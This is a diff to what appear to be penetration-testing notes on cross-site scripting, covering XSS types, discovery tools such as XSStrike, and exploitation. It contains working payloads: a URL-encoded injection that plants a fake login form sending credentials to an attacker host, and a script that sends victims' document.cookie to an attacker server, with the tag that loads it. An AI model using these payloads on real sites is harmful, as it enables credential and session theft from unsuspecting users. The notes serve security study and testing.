@@ -9,7 +9,15 @@ There are three main types of XSS vulnerabilities:
 | Reflected (Non-Persistent) XSS | Occurs when input is processed and shown without storage (e.g., search). |
 | DOM-based XSS       | Occurs when input is client-side processed and displayed (e.g., parameters). |
 
-## XSS Discovery Methods
+## Discovery
+
+### Basic test
+
+```js
+<script>alert(window.origin)</script>
+```
+
+### Tools
 
 - Nessus
 - Burp Pro
@@ -17,17 +25,21 @@ There are three main types of XSS vulnerabilities:
 - [XSS Strike](https://github.com/s0md3v/XSStrike)
 - [XSSer](https://github.com/epsylon/xsser)
 
+#### XSS Strike
 
-### XSS Strike
 ```bash
 git clone https://github.com/s0md3v/XSStrike.git
 cd XSStrike
+python3 -m venv .venv
+source .venv/bin/activate
 pip install -r requirements.txt
 python xsstrike.py
 python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
 ```
 
-## XSS Payloads
+## Exploiting XSS
+
+### XSS Payloads
 
 | Code | Description |
 |------|-------------|
@@ -49,7 +61,7 @@ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
 
 **Note:** XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).
 
-## Phishing
+### Phishing
 
 Initial step is to identify a working payload, ie:
 
@@ -104,9 +116,7 @@ Complete injection code:
 
 The payload should then be added to the URL parameter, encoded, and sent to the victim:
 
-```url
-http://PWNIP/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2FPWNIP%3APWNPO%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--
-```
+```http://PWNIP/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2FPWNIP%3APWNPO%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--```
 
 We can then use a basic PHP listener that will retrieve the creds and send the victim to the origin page, simulating a successful login:
 
@@ -176,7 +186,7 @@ Create two files:
 **script.js**
 
 ```js
-new Image().src='http://PWNIP:PWNPO/index.php?c='+document.cookie;
+new Image().src='http://OURIP/index.php?c='+document.cookie;
 ```
 
 **index.php**
@@ -198,13 +208,13 @@ if (isset($_GET['c'])) {
 Start a php server:
 
 ```bash
-php -S 0.0.0.0:PWNPO
+php -S 0.0.0.0:OURPO
 ```
 
 Use identified exploit to call script.js, ie:
 
 ```js
-"><script src=http://PWNIP:PWNPO/script.js></script>
+"><script src=http://OURIP:OURPO/script.js></script>
 ```
 
 ## Useful Commands
